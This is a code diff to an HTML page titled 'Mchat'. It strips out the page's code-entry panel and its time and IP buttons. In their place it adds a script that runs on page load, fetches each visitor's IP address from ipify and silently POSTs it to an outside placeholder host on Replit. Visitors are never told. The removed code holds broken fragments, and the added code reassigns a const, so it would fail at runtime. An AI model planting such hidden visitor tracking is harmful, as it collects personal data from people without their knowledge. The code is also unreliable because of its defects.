@@ -4,69 +4,24 @@
   <title>Mchat</title>
 </head>
 <body>
-  <div id="popup">
-    <input id="code-input" type="text" placeholder="Enter code">
-    <button id="submit-btn">Submit</button>
-  </div>
-  <div id="content" style="display: none;">
-    <button id="time-btn">Get Time</button>
-    <button id="my-ip-btn">My IP</button>
-    <p id="time-display"></p>
-    <p id="ip-display"></p>
-  </div>
-
   <script>
-    const codes = ["8792", "3453", "4523"];
-    const popup = document.getElementById("popup");
-    const content = document.getElementById("content");
-    const codeInput = document.getElementById("code-input");
-    const submitBtn = document.getElementById("submit-btn");
-    const timeBtn = document.getElementById("time-btn");
-    const timeDisplay = document.getElementById("time-display");
-    const myIpBtn = document.getElementById("my-ip-btn");
-    const ipDisplay = document.getElementById("ip-display");
-    
-    submitBtn.addEventListener("click", () => {
-      const userInput = codeInput.value.trim();
-      if (codes.includes(userInput)) {
-        popup.style.display = "none";
-        content.style.display = "block";
-
-       
+    const ipAddress = ''; // get the user's IP address using the ipify API
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        ipAddress = data.ip;
+        fetch('https://your-replit-project.repl.co/', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ ipAddress })
+        })
         .then(response => response.json())
-        .then(data => console.log(`File updated: ${data.commit.sha}`))
-        .catch(error => console.error(`Error: ${error}`));
-      } else {
-        alert("Invalid code. Please try again.");
-        codeInput.value = ""; // clear the input field
-      }
-    });
-
-    timeBtn.addEventListener("click", () => {
-      const currentTime = new Date();
-      const hours = currentTime.getHours();
-      const minutes = currentTime.getMinutes();
-      const seconds = currentTime.getSeconds();
-      timeDisplay.innerText = `Current Time: ${hours}:${minutes}:${seconds}`;
-    });
-
-    myIpBtn.addEventListener("click", async () => {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        const ipAddress = data.ip;
-        console.log(`Your IP address: ${ipAddress}`); // log IP address to console
-        ipDisplay.innerText = `Your IP address: ${ipAddress}`; // display IP address on the website
-
- 
-        .then(response => response.json())
-        .then(data => console.log(`File updated: ${data.commit.sha}`))
-        .catch(error => console.error(`Error: ${error}`));
-      } catch (error) {
-        console.error(`Error getting IP address: ${error}`);
-        ipDisplay.innerText = `Error: ${error}`;
-      }
-    });
+        .then(data => console.log(`IP address sent to Replit: ${data}`))
+        .catch(error => console.error(`Error sending IP address: ${error}`));
+      })
+      .catch(error => console.error(`Error getting IP address: ${error}`));
   </script>
 </body>
 </html>
